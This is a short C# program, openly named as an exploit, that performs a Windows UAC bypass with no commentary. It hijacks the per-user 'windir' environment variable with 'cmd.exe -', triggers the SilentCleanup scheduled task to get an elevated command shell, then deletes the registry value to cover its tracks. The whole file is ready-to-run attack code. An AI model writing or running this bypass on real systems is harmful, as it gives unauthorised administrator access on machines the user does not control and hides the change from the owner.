using System.Diagnostics; using System.Threading; using Microsoft.Win32;

namespace ByNs {
    class ExploitCl {
        static void Main(string[] args) {
            RegistryKey rK;
            Process p = new Process();
            rK = Registry.CurrentUser.CreateSubKey("Environment");
            rK.SetValue("windir", @"cmd.exe -");
            p.StartInfo.FileName = "schtasks.exe";
            p.StartInfo.Arguments = "/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I";
            p.Start();
            Thread.Sleep(500);
            rK.DeleteValue("windir");
            rK.Close();
        }
    }
}
